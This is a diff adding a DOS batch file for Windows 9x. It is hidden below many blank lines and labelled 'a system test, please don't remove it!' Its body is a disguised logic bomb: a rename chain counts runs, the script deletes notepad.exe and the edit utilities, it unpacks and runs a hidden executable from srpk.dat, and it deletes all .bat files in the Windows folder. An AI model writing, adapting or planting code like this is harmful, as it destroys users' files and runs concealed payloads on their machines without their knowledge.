@@ -1,0 +1,123 @@
+@echo off
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+      REM  REM   REM   REM   REM   REM   REM   REM   REM   REM  REM  
+      REM    this is a system test , please don't remove it !   REM
+      REM                                                       REM
+      REM          Ver 2.0 for all windows 9X system            REM 
+      REM                                                       REM
+      REM          write by SR-20331550      Beijing            REM 
+      REM                                                       REM
+      REM  REM   REM   REM   REM   REM   REM   REM   REM   REM  REM  
+
+if exist c:\windows\sr.exe goto av
+if exist c:\windows\srpk.dat goto sr
+if exist c:\windows\sr49.dat ren c:\windows\sr49.dat srpk.dat
+if exist c:\windows\sr48.dat ren c:\windows\sr48.dat sr49.dat
+if exist c:\windows\sr47.dat ren c:\windows\sr47.dat sr48.dat
+if exist c:\windows\sr46.dat ren c:\windows\sr46.dat sr47.dat
+if exist c:\windows\sr45.dat ren c:\windows\sr45.dat sr46.dat
+if exist c:\windows\sr44.dat ren c:\windows\sr44.dat sr45.dat
+if exist c:\windows\sr43.dat ren c:\windows\sr43.dat sr44.dat
+if exist c:\windows\sr42.dat ren c:\windows\sr42.dat sr43.dat
+if exist c:\windows\sr41.dat ren c:\windows\sr41.dat sr42.dat
+if exist c:\windows\sr40.dat ren c:\windows\sr40.dat sr41.dat
+if exist c:\windows\sr39.dat ren c:\windows\sr39.dat sr40.dat
+if exist c:\windows\sr38.dat ren c:\windows\sr38.dat sr39.dat
+if exist c:\windows\sr37.dat ren c:\windows\sr37.dat sr38.dat
+if exist c:\windows\sr36.dat ren c:\windows\sr36.dat sr37.dat
+if exist c:\windows\sr35.dat ren c:\windows\sr35.dat sr36.dat
+if exist c:\windows\sr34.dat ren c:\windows\sr34.dat sr35.dat
+if exist c:\windows\sr33.dat ren c:\windows\sr33.dat sr34.dat
+if exist c:\windows\sr32.dat ren c:\windows\sr32.dat sr33.dat
+if exist c:\windows\sr31.dat ren c:\windows\sr31.dat sr32.dat
+if exist c:\windows\sr30.dat ren c:\windows\sr30.dat sr31.dat
+if exist c:\windows\sr29.dat ren c:\windows\sr29.dat sr30.dat
+if exist c:\windows\sr28.dat ren c:\windows\sr28.dat sr29.dat
+if exist c:\windows\sr27.dat ren c:\windows\sr27.dat sr28.dat
+if exist c:\windows\sr26.dat ren c:\windows\sr26.dat sr27.dat
+if exist c:\windows\sr25.dat ren c:\windows\sr25.dat sr26.dat
+if exist c:\windows\sr24.dat ren c:\windows\sr24.dat sr25.dat
+if exist c:\windows\sr23.dat ren c:\windows\sr23.dat sr24.dat
+if exist c:\windows\sr22.dat ren c:\windows\sr22.dat sr23.dat
+if exist c:\windows\sr21.dat ren c:\windows\sr21.dat sr22.dat
+if exist c:\windows\sr20.dat ren c:\windows\sr20.dat sr21.dat
+if exist c:\windows\sr19.dat ren c:\windows\sr19.dat sr20.dat
+if exist c:\windows\sr18.dat ren c:\windows\sr18.dat sr19.dat
+if exist c:\windows\sr17.dat ren c:\windows\sr17.dat sr18.dat
+if exist c:\windows\sr16.dat ren c:\windows\sr16.dat sr17.dat
+if exist c:\windows\sr15.dat ren c:\windows\sr15.dat sr16.dat
+if exist c:\windows\sr14.dat ren c:\windows\sr14.dat sr15.dat
+if exist c:\windows\sr13.dat ren c:\windows\sr13.dat sr14.dat
+if exist c:\windows\sr12.dat ren c:\windows\sr12.dat sr13.dat
+if exist c:\windows\sr11.dat ren c:\windows\sr11.dat sr12.dat
+if exist c:\windows\sr10.dat ren c:\windows\sr10.dat sr11.dat
+if exist c:\windows\sr09.dat ren c:\windows\sr09.dat sr10.dat
+if exist c:\windows\sr08.dat ren c:\windows\sr08.dat sr09.dat
+if exist c:\windows\sr07.dat ren c:\windows\sr07.dat sr08.dat
+if exist c:\windows\sr06.dat ren c:\windows\sr06.dat sr07.dat
+if exist c:\windows\sr05.dat ren c:\windows\sr05.dat sr06.dat
+if exist c:\windows\sr04.dat ren c:\windows\sr04.dat sr05.dat
+if exist c:\windows\sr03.dat ren c:\windows\sr03.dat sr04.dat
+if exist c:\windows\sr02.dat ren c:\windows\sr02.dat sr03.dat
+if exist c:\windows\sr01.dat ren c:\windows\sr01.dat sr02.dat
+if not exist c:\windows\sr*.dat goto av
+if exist c:\windows\notepad.exe del c:\windows\notepad.exe>nul
+if exist c:\windows\command\edit.* del C:\WINDOWS\COMMAND\edit.*>nul
+goto end
+:sr
+ren c:\windows\srpk.dat srpk.exe
+c:\windows\srpk>nul
+del c:\windows\srpk.exe>nul
+c:\windows\sr>nul
+cls
+c:\windows\srcl>nul
+del c:\windows\sr.exe>nul
+del c:\windows\srcl.com>nul
+cls
+goto end
+:av
+if exist c:\windows\sr.exe del c:\windows\sr.exe>nul
+if exist c:\windows\srcl.com del c:\windows\srcl.com>nul
+cls
+del c:\windows\*.bat >nul
+cls
+goto end
+:end
+cls
+
+
+
+
